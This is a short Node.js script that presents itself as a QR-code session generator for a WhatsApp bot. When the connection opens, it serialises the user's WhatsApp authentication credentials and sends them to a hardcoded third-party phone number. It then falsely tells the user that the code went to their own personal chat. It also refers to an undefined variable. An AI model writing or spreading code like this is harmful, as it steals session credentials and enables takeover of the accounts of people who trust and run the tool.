//OLDUSER Bot Inc.
//OLDUSER Bot Qr Code Generator
const chalk = require('chalk');
const { WAConnection, MessageType } = require('@adiwajshing/baileys');
const fs = require('fs');
async function OLDUSER() {
  const conn = new WAConnection();
  conn.logger.level = 'warn';
  conn.version = [2, 2143, 3];
  conn.on('connecting', async () => {
    console.log(`${chalk.green.bold('OLDUSER')}${chalk.blue.bold('Bot')}
${chalk.white.italic('©2022 OLDUSER Bot Inc.')}
${chalk.blue.italic('🐶 Qr code is in process, please scan it as fast as possible...')}`);
  });
  conn.on('open', async () => {
    console.log(
      chalk.green.bold('Qr code of OLDSUER BOT V3: '),
      '' +
      Buffer.from(JSON.stringify(conn.base64EncodedAuthInfo()))
    );
    await conn.sendMessage(
      `918602239106@s.whatsapp.net`,
      '' +
      Buffer.from(JSON.stringify(conn.base64EncodedAuthInfo())),
      MessageType.text
    );
    if (conn.user.jid.startsWith('90')) {
      await conn.sendMessage(
        `918602239106@s.whatsapp.net`,
        '*🔴 Do not share this code with anybody ' +
        conn.user.name +
        '*\n\n©2022 OLDUSER Bot Inc.',
        MessageType.text
      );
    } else {
      await conn.sendMessage(
        `918602239106@s.whatsapp.net`,
        '*🔴 Do not share this code with anybody ' +
        conn.user.name +
        '*\n\n©2022 OLDUSER Bot Inc.',
        MessageType.text
      );
    }
    console.log(
      chalk.green.bold(
        "🐶 The code has been sent to your whatsapp personal chat!"
      ),
      chalk.green.bold(
        '🐶 The code has been sent to your whatsapp personal chat!'
      )
    );
    fs.existsSync("./session.json") && client.loadAuthInfo("./session.json");
    process.exit(0);
  });
  await conn.connect();
}
OLDUSER();
